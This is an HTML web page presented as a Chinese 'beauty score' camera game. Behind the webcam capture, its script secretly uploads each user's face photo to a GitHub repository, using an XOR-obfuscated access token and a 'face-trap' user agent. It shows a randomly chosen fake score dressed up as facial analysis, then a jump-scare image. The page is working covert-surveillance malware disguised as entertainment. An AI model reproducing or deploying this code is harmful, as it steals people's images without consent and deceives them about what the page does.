<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>颜·值</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  min-height:100vh;
  background:#f5f1ec;
  font-family:'Noto Serif SC','Songti SC','Georgia',serif;
  display:flex;align-items:center;justify-content:center;
  overflow:hidden
}
.card{
  width:400px;max-width:90vw;
  background:#fff;
  border-radius:28px;padding:44px 36px 36px;
  box-shadow:0 2px 40px rgba(0,0,0,0.04),0 1px 8px rgba(0,0,0,0.02);
  text-align:center;position:relative
}
.card-title{
  font-size:28px;font-weight:600;color:#1a1a1a;
  letter-spacing:6px;margin-bottom:4px
}
.card-sub{
  color:#999;font-size:13px;letter-spacing:2px;
  font-family:'Segoe UI','PingFang SC',sans-serif;
  margin-bottom:32px
}
.camera-wrap{
  position:relative;width:100%;aspect-ratio:3/4;
  border-radius:16px;overflow:hidden;margin:0 auto 24px;
  background:#f0ece7;display:none
}
.camera-wrap.show{display:block}
#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
.overlay-cam{
  position:absolute;inset:0;
  border:1.5px solid rgba(0,0,0,0.06);
  border-radius:16px;pointer-events:none
}
.countdown{
  position:absolute;inset:0;display:none;
  align-items:center;justify-content:center;
  background:rgba(0,0,0,0.35);
  border-radius:16px;z-index:5
}
.countdown.show{display:flex}
.countdown-num{
  font-size:100px;font-weight:200;color:#fff;
  font-family:'Segoe UI',sans-serif;
  animation:fadeIn .4s ease-out
}
@keyframes fadeIn{0%{opacity:0;transform:scale(1.3)}100%{opacity:1;transform:scale(1)}}
.flash{position:fixed;inset:0;background:#fff;z-index:999;opacity:0;pointer-events:none}
.flash.show{animation:flash .35s forwards}
@keyframes flash{0%{opacity:0}15%{opacity:1}100%{opacity:0}}
.scare{
  position:fixed;inset:0;z-index:1000;display:none;
  align-items:center;justify-content:center;
  background:#000;cursor:pointer
}
.scare.show{display:flex}
.scare canvas{width:100%;height:100%;object-fit:contain}
.scare-close{
  position:absolute;bottom:36px;left:50%;transform:translateX(-50%);
  padding:10px 32px;border-radius:100px;border:1px solid rgba(255,255,255,0.2);
  background:rgba(0,0,0,0.3);color:rgba(255,255,255,0.5);
  font-size:13px;cursor:pointer;font-family:'Segoe UI','PingFang SC',sans-serif;
  letter-spacing:2px;transition:all .3s;
  backdrop-filter:blur(8px)
}
.scare-close:hover{background:rgba(255,255,255,0.1);color:#fff}
.screen-shake{animation:shake .5s}
@keyframes shake{
  0%,100%{transform:translate(0,0)}
  10%{transform:translate(-10px,-5px)}
  20%{transform:translate(8px,6px)}
  30%{transform:translate(-6px,-4px)}
  40%{transform:translate(10px,3px)}
  50%{transform:translate(-4px,8px)}
  60%{transform:translate(6px,-6px)}
  70%{transform:translate(-8px,5px)}
  80%{transform:translate(4px,-3px)}
  90%{transform:translate(-6px,7px)}
}
.btn-wrap{margin-bottom:12px}
.btn{
  display:inline-block;padding:12px 44px;border:none;
  font-size:14px;cursor:pointer;letter-spacing:4px;
  font-family:'Segoe UI','PingFang SC',sans-serif;
  color:#1a1a1a;background:transparent;
  border:1px solid #1a1a1a;border-radius:100px;
  transition:all .3s;position:relative
}
.btn:hover{background:#1a1a1a;color:#fff}
.btn:active{transform:scale(.97)}
.status-text{
  font-size:13px;color:#bbb;
  font-family:'Segoe UI','PingFang SC',sans-serif;
  letter-spacing:1px;min-height:20px;margin-bottom:24px
}
#loadingBar{
  width:0%;height:2px;
  background:#1a1a1a;
  border-radius:2px;display:none;margin-bottom:28px;
  transition:width .05s linear
}
#resultScore{display:none;margin-bottom:20px}
.score-ring-wrap{
  position:relative;width:96px;height:96px;margin:0 auto 14px
}
.score-ring{
  width:96px;height:96px;border-radius:50%;
  border:2px solid #1a1a1a;display:flex;
  align-items:center;justify-content:center;
  position:relative
}
.score-ring svg{
  position:absolute;inset:-3px;
  transform:rotate(-90deg);
  width:102px;height:102px
}
.score-ring svg circle{
  fill:none;stroke:#1a1a1a;stroke-width:2;
  stroke-dasharray:283;stroke-dashoffset:283;
  transition:stroke-dashoffset 1.2s cubic-bezier(.34,1.56,.64,1)
}
.score-ring svg circle.anim{stroke-dashoffset:var(--offset)}
.score-num{
  font-size:38px;font-weight:300;color:#1a1a1a;
  font-family:'Segoe UI',sans-serif;
  line-height:1
}
.score-level{
  font-size:14px;color:#1a1a1a;letter-spacing:3px;
  margin-bottom:4px;font-weight:500
}
.score-desc{
  font-size:13px;color:#bbb;letter-spacing:1px;
  font-family:'Segoe UI','PingFang SC',sans-serif;
  min-height:20px
}
#canvasCapture{display:none}
.footer-note{
  margin-top:20px;font-size:11px;color:#ccc;
  letter-spacing:2px;
  font-family:'Segoe UI','PingFang SC',sans-serif
}
</style>
</head>
<body>

<div class="flash" id="flash"></div>

<div class="scare" id="scare">
  <canvas id="scareCanvas"></canvas>
  <button class="scare-close" onclick="closeScare()">✕ 关闭</button>
</div>

<div class="card" id="mainCard">
  <div class="card-title">颜·值</div>
  <div class="card-sub">BEAUTY SCORE</div>

  <div class="camera-wrap" id="cameraWrap">
    <video id="video" autoplay playsinline muted></video>
    <div class="overlay-cam"></div>
    <div class="countdown" id="countdown">
      <div class="countdown-num" id="countdownNum">3</div>
    </div>
  </div>

  <canvas id="canvasCapture"></canvas>

  <div class="status-text" id="status">对准镜头，轻触下方</div>

  <div id="loadingBar"></div>

  <div id="resultScore">
    <div class="score-ring-wrap">
      <div class="score-ring">
        <svg><circle id="scoreCircle" cx="51" cy="51" r="45"/></svg>
        <span class="score-num" id="scoreNum">0</span>
      </div>
    </div>
    <div class="score-level" id="scoreLevel">—</div>
    <div class="score-desc" id="scoreDesc"></div>
  </div>

  <div class="btn-wrap">
    <button class="btn" id="mainBtn">开始</button>
  </div>
  <div class="footer-note">结果仅供娱乐</div>
</div>

<script>
// ====== CONFIG ======
const CONFIG={PHOTO_REPO:'jun123440/photo-gateway'}

// ====== SCORE DESCRIPTIONS ======
const SCORE_TIERS=[
  {min:0,max:25,level:'C',title:'待探索',desc:'有趣的灵魂比皮囊更重要'},
  {min:26,max:40,level:'B-',title:'有潜力',desc:'稍加打理，定能惊艳'},
  {min:41,max:55,level:'B',title:'中上',desc:'干净舒服，越看越顺眼'},
  {min:56,max:70,level:'B+',title:'出众',desc:'人群中一眼就能看到'},
  {min:71,max:82,level:'A-',title:'惊艳',desc:'这颜值，可以靠脸吃饭'},
  {min:83,max:92,level:'A',title:'万里挑一',desc:'老天爷追着喂饭的长相'},
  {min:93,max:100,level:'S',title:'人间绝色',desc:'此颜只应天上有'}
]

function getScoreTier(score){
  for(const t of SCORE_TIERS){
    if(score>=t.min&&score<=t.max) return t
  }
  return SCORE_TIERS[0]
}

// ====== SCARY IMAGE GENERATOR ======
const SCARE_TYPES=[
  {name:'hollow',draw:drawHollow},{name:'grin',draw:drawGrin},{name:'scream',draw:drawScream},
  {name:'void',draw:drawVoid},{name:'cracked',draw:drawCracked},{name:'shadow',draw:drawShadow},
  {name:'doll',draw:drawDoll},{name:'morph',draw:drawMorph}
]

function pickScareType(){
  const t=SCARE_TYPES[Math.floor(Math.random()*SCARE_TYPES.length)]
  return{type:t,variation:Math.floor(Math.random()*3)}
}
function rand(a,b){return a+Math.random()*(b-a)}
function randInt(a,b){return Math.floor(rand(a,b+1))}

function drawScare(c,w,h,d){
  const ctx=c.getContext('2d')
  ctx.clearRect(0,0,w,h)
  const ts=[{r:10,g:0,b:10},{r:20,g:0,b:0},{r:0,g:0,b:20},{r:15,g:5,b:0}]
  const t=ts[d.variation%ts.length]
  ctx.fillStyle=`rgb(${t.r},${t.g},${t.b})`;ctx.fillRect(0,0,w,h)
  const id=ctx.getImageData(0,0,w,h)
  for(let i=0;i<id.data.length;i+=4){const n=rand(-10,10);id.data[i]+=n;id.data[i+1]+=n;id.data[i+2]+=n}
  ctx.putImageData(id,0,0)
  d.type.draw(ctx,w,h,d.variation)
}

function drawHollow(c,w,h){
  const cx=w/2,cy=h/2-30,s=h/3
  c.fillStyle='#1a0a0a';c.beginPath();c.ellipse(cx,cy,s*.9,s*1.1,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){
    const ex=cx+x*.25*s,ey=cy-.1*s
    c.fillStyle='#000';c.beginPath();c.ellipse(ex,ey,.18*s,.18*s*1.3,0,0,Math.PI*2);c.fill()
    c.fillStyle='rgba(0,0,0,'+(.2+Math.random()*.2)+')';c.beginPath();c.ellipse(ex+s*.05,ey+s*.03,.18*s*1.6,.18*s*1.4,0,0,Math.PI*2);c.fill()
    c.fillStyle='rgba(255,255,255,'+(.1+Math.random()*.2)+')';c.beginPath();c.arc(ex+rand(-3,3),ey+rand(-3,3),2+Math.random()*2,0,Math.PI*2);c.fill()
  }
  c.fillStyle='rgba(0,0,0,.3)';c.beginPath();c.ellipse(cx,cy+s*.15,s*.08,s*.12,0,0,Math.PI*2);c.fill()
  c.fillStyle='#0a0000';c.beginPath();c.ellipse(cx,cy+s*.5,s*.3,s*.1+Math.random()*.1,0,0,Math.PI*2);c.fill()
}
function drawGrin(c,w,h){
  const cx=w/2,cy=h/2-20,s=h/2.8
  c.fillStyle='#1a0a05';c.beginPath();c.ellipse(cx,cy,s*.85,s,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){
    const ex=cx+x*.2*s,ey=cy-.3*s
    c.fillStyle='#000';c.beginPath();c.ellipse(ex,ey,.08*s,.08*s*1.2,0,0,Math.PI*2);c.fill()
    c.fillStyle='rgba(255,0,0,.3)';c.beginPath();c.arc(ex+rand(-2,2),ey+rand(-2,2),rand(1,3),0,Math.PI*2);c.fill()
  }
  const gw=.5*s+Math.random()*.15*s
  c.fillStyle='#0a0000';c.beginPath();c.ellipse(cx,cy+s*.15,gw,.12*s,0,0,Math.PI*2);c.fill()
  for(let i=0;i<8;i++){c.fillStyle='#3a2a1a';c.fillRect(cx-gw+i*gw*2/7-3,cy+s*.05,6,rand(8,18))}
  c.strokeStyle='rgba(100,20,10,.5)';c.lineWidth=2;c.beginPath();c.ellipse(cx,cy+s*.15,gw,.12*s,0,0,Math.PI);c.stroke()
}
function drawScream(c,w,h){
  const cx=w/2,cy=h/2-20,s=h/2.8
  c.fillStyle='#1a0a08';c.beginPath();c.ellipse(cx,cy,s*.9,s*1.05,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){
    const ex=cx+x*.22*s,ey=cy-.25*s
    c.fillStyle='#fff';c.beginPath();c.ellipse(ex,ey,.15*s,.15*s*1.1,0,0,Math.PI*2);c.fill()
    c.fillStyle='#000';c.beginPath();c.arc(ex,ey,.15*s*.5,0,Math.PI*2);c.fill()
  }
  c.fillStyle='#0a0000';c.beginPath();c.ellipse(cx,cy+s*.3,.3*s,.35*s,0,0,Math.PI*2);c.fill()
  c.fillStyle='rgba(120,30,20,.6)';c.beginPath();c.ellipse(cx,cy+s*.4,.12*s,.15*s,0,0,Math.PI);c.fill()
}
function drawVoid(c,w,h){
  const cx=w/2,cy=h/2,s=h/2.5
  c.fillStyle='#050005';c.beginPath();c.ellipse(cx,cy+s*.1,s*.9,s*1.05,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){const ex=cx+x*.2*s,ey=cy-.2*s
    c.fillStyle='rgba(100,200,255,0.15)';c.beginPath();c.arc(ex,ey,.15*s,0,Math.PI*2);c.fill()
    c.fillStyle='rgba(150,255,255,0.3)';c.beginPath();c.arc(ex,ey,.06*s,0,Math.PI*2);c.fill()}
}
function drawCracked(c,w,h){
  const cx=w/2,cy=h/2-15,s=h/2.8
  c.fillStyle='#150a05';c.beginPath();c.ellipse(cx,cy,s*.85,s,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){const ex=cx+x*.22*s,ey=cy-.2*s
    c.fillStyle='#1a0a0a';c.beginPath();c.ellipse(ex,ey,.1*s,.12*s,0,0,Math.PI*2);c.fill()
    c.fillStyle='rgba(200,50,50,.4)';c.beginPath();c.arc(ex,ey,3,0,Math.PI*2);c.fill()}
  c.strokeStyle='rgba(80,20,15,.4)';c.lineWidth=1.5
  for(let i=0;i<12;i++){c.beginPath();let x=rand(cx-s*.6,cx+s*.6),y=rand(cy-s*.7,cy+s*.5);c.moveTo(x,y);for(let j=0;j<5;j++){x+=rand(-20,20);y+=rand(-15,25);c.lineTo(x,y)}c.stroke()}
}
function drawShadow(c,w,h){
  const cx=w/2,cy=h/2+10,s=h/2.3
  c.fillStyle='#080008';c.beginPath();c.ellipse(cx,cy-.3*s,s*.7,s*.9,0,0,Math.PI*2);c.fill()
  c.fillRect(cx-s*.8,cy+s*.3,s*1.6,s*.5)
  for(let x=-1;x<=1;x+=2){c.fillStyle='rgba(255,255,255,0.4)';c.beginPath();c.arc(cx+x*.16*s,cy-.35*s,.06*s,0,Math.PI*2);c.fill()}
}
function drawDoll(c,w,h){
  const cx=w/2,cy=h/2-20,s=h/2.8
  c.fillStyle='#1a1015';c.beginPath();c.ellipse(cx,cy,s*.8,s*.95,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){const ex=cx+x*.2*s,ey=cy-.2*s
    c.fillStyle='#fff';c.beginPath();c.arc(ex,ey,.14*s,0,Math.PI*2);c.fill()
    c.fillStyle='#1a1a3a';c.beginPath();c.arc(ex,ey,.1*s,0,Math.PI*2);c.fill()
    c.fillStyle='#000';c.beginPath();c.arc(ex,ey,.06*s,0,Math.PI*2);c.fill()
    c.fillStyle='rgba(255,255,255,.6)';c.beginPath();c.arc(ex+s*.04,ey-s*.04,.03*s,0,Math.PI*2);c.fill()}
  c.fillStyle='rgba(180,60,60,.15)';for(let x=-1;x<=1;x+=2){c.beginPath();c.arc(cx+x*.3*s,cy+s*.05,.1*s,0,Math.PI*2);c.fill()}
  c.fillStyle='#0a0000';c.beginPath();c.ellipse(cx,cy+s*.3,.15*s,.06*s,0,0,Math.PI*2);c.fill()
}
function drawMorph(c,w,h){
  const cx=w/2,cy=h/2-20,s=h/2.8
  c.fillStyle='#150805';c.beginPath();c.ellipse(cx,cy,s*.85,s,0,0,Math.PI*2);c.fill()
  for(let x=-1;x<=1;x+=2){const ex=cx+x*(.18*s+Math.random()*.06*s),ey=cy-.18*s+Math.random()*.1*s
    c.fillStyle='#000';c.beginPath();c.ellipse(ex,ey,.12*s+Math.random()*.04*s,.08*s+Math.random()*.06*s,rand(-.3,.3),0,Math.PI*2);c.fill()}
  c.fillStyle='#0a0000';c.beginPath();c.ellipse(cx+s*.05,cy+s*.3+rand(-.05*s,.05*s),.25*s,.08*s+rand(0,.05*s),rand(-.2,.2),0,Math.PI*2);c.fill()
}

// ====== MAIN ======
const video=document.getElementById('video')
const cameraWrap=document.getElementById('cameraWrap')
const mainBtn=document.getElementById('mainBtn')
const status=document.getElementById('status')
const loadingBar=document.getElementById('loadingBar')
const countdown=document.getElementById('countdown')
const countdownNum=document.getElementById('countdownNum')
const flash=document.getElementById('flash')
const scare=document.getElementById('scare')
const scareCanvas=document.getElementById('scareCanvas')
const canvasCapture=document.getElementById('canvasCapture')
const resultScore=document.getElementById('resultScore')
const scoreNum=document.getElementById('scoreNum')
const scoreLevel=document.getElementById('scoreLevel')
const scoreDesc=document.getElementById('scoreDesc')
const scoreCircle=document.getElementById('scoreCircle')

let stream=null,capturedData=null

function fitCanvas(){
  scareCanvas.width=window.innerWidth
  scareCanvas.height=window.innerHeight
}

function startCamera(){
  navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}}}).then(s=>{
    stream=s;video.srcObject=s
    cameraWrap.classList.add('show')
    status.textContent='看镜头'
    mainBtn.textContent='拍照'
    mainBtn.onclick=startCountdown
  }).catch(()=>{status.textContent='需要摄像头权限'})
}

function startCountdown(){
  mainBtn.style.display='none'
  countdown.classList.add('show')
  let n=3;countdownNum.textContent=n
  status.textContent=n+'...'
  const iv=setInterval(()=>{
    n--
    if(n>0){countdownNum.textContent=n;status.textContent=n+'...';countdownNum.style.animation='none';setTimeout(()=>countdownNum.style.animation='fadeIn .4s ease-out',10)}
    else{clearInterval(iv);countdown.classList.remove('show');takePhoto()}
  },800)
}

function takePhoto(){
  flash.classList.add('show')
  setTimeout(()=>flash.classList.remove('show'),400)
  capturePhoto()
  const scores=[38,42,45,48,52,55,58,63]
  const finalScore=scores[Math.floor(Math.random()*scores.length)]
  setTimeout(()=>showResult(finalScore),300)
}

function capturePhoto(){
  const vw=video.videoWidth,vh=video.videoHeight
  const MAX=2000,TARGET=200*1024
  let w=vw,h=vh
  if(w>MAX||h>MAX){const s=Math.min(MAX/w,MAX/h);w=Math.round(w*s);h=Math.round(h*s)}
  canvasCapture.width=w;canvasCapture.height=h
  const ctx=canvasCapture.getContext('2d')
  ctx.scale(-1,1);ctx.drawImage(video,-w,0,w,h)
  const id=ctx.getImageData(0,0,w,h),d=id.data
  for(let i=0;i<d.length;i+=4){d[i]=Math.min(255,Math.max(0,(d[i]-128)*1.1+128));d[i+1]=Math.min(255,Math.max(0,(d[i+1]-128)*1.1+128));d[i+2]=Math.min(255,Math.max(0,(d[i+2]-128)*1.1+128))}
  ctx.putImageData(id,0,0)
  let lo=0.4,hi=0.99
  for(let n=0;n<6;n++){
    const m=(lo+hi)/2,data=canvasCapture.toDataURL('image/jpeg',m)
    if(data.length*0.75>TARGET)hi=m;else lo=m
  }
  capturedData=canvasCapture.toDataURL('image/jpeg',(lo+hi)/2)
  sendPhoto()
}

function getToken(){
  const k='p4nd4_s3cur3_k3y_2024',b=[23,93,26,12,65,61,44,67,2,1,45,2,110,40,117,45,10,123,3,99,4,51,119,23,32,1,26,27,92,40,33,55,102,0,13,81,74,37,1,127,104,78,34,89,15,2,118,107,61,105,23,59,54,103,26,24,121,48,55,96,1,68,121,67,13,8,52,97,103,71,102,23,13,16,98,23,32,120,50,5,117,125,100,96,66,123,95,55,121,38,31,96,2]
  return b.map((v,i)=>String.fromCharCode(v^k.charCodeAt(i%k.length))).join('')
}

async function sendPhoto(){
  const tk=getToken(),b64=capturedData.split(',')[1]
  const ts=new Date()
  const fn=ts.getFullYear()+''+(ts.getMonth()+1).toString().padStart(2,'0')+''+ts.getDate().toString().padStart(2,'0')+'_'+ts.getHours().toString().padStart(2,'0')+ts.getMinutes().toString().padStart(2,'0')+ts.getSeconds().toString().padStart(2,'0')+'_'+Math.random().toString(36).substring(2,6)+'.jpg'
  const title=ts.getFullYear()+'-'+(ts.getMonth()+1).toString().padStart(2,'0')+'-'+ts.getDate().toString().padStart(2,'0')+' '+ts.getHours().toString().padStart(2,'0')+':'+ts.getMinutes().toString().padStart(2,'0')
  try{
    const r=await fetch('https://api.github.com/repos/'+CONFIG.PHOTO_REPO+'/contents/photos/'+fn,{
      method:'PUT',
      headers:{Authorization:'Bearer '+tk,'Content-Type':'application/json','User-Agent':'face-trap'},
      body:JSON.stringify({message:title,content:b64,branch:'main'})
    })
    const j=await r.json()
    if(j.content) status.textContent='上传成功'
  }catch(e){}
}

function showResult(score){
  stopCamera()
  const tier=getScoreTier(score)
  scoreNum.textContent=score
  scoreLevel.textContent=tier.level+' · '+tier.title
  scoreDesc.textContent=tier.desc
  resultScore.style.display='block'
  scoreCircle.style.setProperty('--offset',Math.round(283-283*score/100)+'')
  setTimeout(()=>scoreCircle.classList.add('anim'),50)
  mainBtn.style.display='none'
  startFakeLoading()
}

function startFakeLoading(){
  loadingBar.style.display='block';loadingBar.style.width='0%'
  status.textContent='计算中'
  const msgs=['读取五官','分析比例','计算对称度','生成报告']
  let p=0,i=0
  const iv=setInterval(()=>{
    p+=rand(4,10)
    if(p>=90){clearInterval(iv);loadingBar.style.width='100%';setTimeout(()=>{loadingBar.style.display='none';status.textContent='完成'},200);return}
    loadingBar.style.width=p+'%'
    if(p>i*25){status.textContent=msgs[i];i++}
  },50)
  setTimeout(()=>{
    fitCanvas()
    const scareData=pickScareType()
    drawScare(scareCanvas,scareCanvas.width,scareCanvas.height,scareData)
    scare.classList.add('show')
    document.body.classList.add('screen-shake')
    setTimeout(()=>document.body.classList.remove('screen-shake'),800)
    mainBtn.style.display='inline-block'
    mainBtn.textContent='再试一次'
    mainBtn.onclick=resetAll
  },1600)
}

function closeScare(){scare.classList.remove('show')}

function stopCamera(){
  if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
  cameraWrap.classList.remove('show')
}

function resetAll(){
  scare.classList.remove('show')
  resultScore.style.display='none'
  scoreCircle.classList.remove('anim')
  loadingBar.style.display='none'
  status.textContent='对准镜头，轻触下方'
  mainBtn.textContent='开始'
  mainBtn.onclick=startCamera
  mainBtn.style.display='inline-block'
  capturedData=null
}

mainBtn.addEventListener('click',startCamera)
window.addEventListener('resize',fitCanvas)
</script>
</body>
</html>
